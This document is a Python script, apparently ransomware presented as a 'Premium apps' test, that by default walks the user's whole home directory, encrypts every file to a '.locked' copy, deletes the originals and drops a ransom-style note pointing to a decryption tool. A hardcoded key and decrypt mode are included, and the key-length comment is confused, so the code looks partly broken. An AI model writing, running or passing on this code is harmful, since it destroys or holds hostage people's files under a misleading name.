import os
import sys
import platform
import asyncio
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# Configuration
ENCRYPTION_KEY = b'helloworld' * 2  # 16 bytes for AES-128, padded to 32 for AES-256
PREMIUM_NOTE = "premium_apps_info.txt"
NOTE_CONTENT = """This is a Premium apps test. Files have been secured.
To unlock, run the provided decryption tool.
For testing purposes only!"""

def generate_iv():
    return os.urandom(16)

def encrypt_file(file_path, key):
    try:
        iv = generate_iv()
        cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        
        with open(file_path, 'rb') as f:
            data = f.read()
        
        encrypted_data = encryptor.update(data) + encryptor.finalize()
        
        with open(file_path + '.locked', 'wb') as f:
            f.write(iv + encrypted_data)
        
        os.remove(file_path)  # Remove original file
        return True
    except Exception:
        return False

def decrypt_file(file_path, key):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        
        iv = data[:16]
        encrypted_data = data[16:]
        
        cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        
        decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
        
        original_path = file_path.replace('.locked', '')
        with open(original_path, 'wb') as f:
            f.write(decrypted_data)
        
        os.remove(file_path)  # Remove encrypted file
        return True
    except Exception:
        return False

def create_premium_note(root_dir):
    note_path = os.path.join(root_dir, PREMIUM_NOTE)
    with open(note_path, 'w') as f:
        f.write(NOTE_CONTENT)

async def main(mode="encrypt"):
    root_dir = os.path.expanduser("~")  # Start in user’s home directory
    if mode == "encrypt":
        print("Initiating Premium apps process...")
        create_premium_note(root_dir)
        
        for dirpath, _, filenames in os.walk(root_dir):
            for filename in filenames:
                if filename != PREMIUM_NOTE and not filename.endswith('.locked'):
                    file_path = os.path.join(dirpath, filename)
                    if encrypt_file(file_path, ENCRYPTION_KEY):
                        print(f"Secured: {file_path}")
        
        print(f"Premium apps info written to: {os.path.join(root_dir, PREMIUM_NOTE)}")
    
    elif mode == "decrypt":
        print("Restoring Premium apps access...")
        for dirpath, _, filenames in os.walk(root_dir):
            for filename in filenames:
                if filename.endswith('.locked'):
                    file_path = os.path.join(dirpath, filename)
                    if decrypt_file(file_path, ENCRYPTION_KEY):
                        print(f"Restored: {file_path}")
        
        note_path = os.path.join(root_dir, PREMIUM_NOTE)
        if os.path.exists(note_path):
            os.remove(note_path)
            print(f"Removed: {note_path}")

if __name__ == "__main__":
    mode = "encrypt" if len(sys.argv) < 2 else sys.argv[1]
    if mode not in ["encrypt", "decrypt"]:
        print("Usage: premium_apps.exe [encrypt|decrypt]")
        sys.exit(1)
    
    if platform.system() == "Emscripten":
        asyncio.ensure_future(main(mode))
    else:
        asyncio.run(main(mode))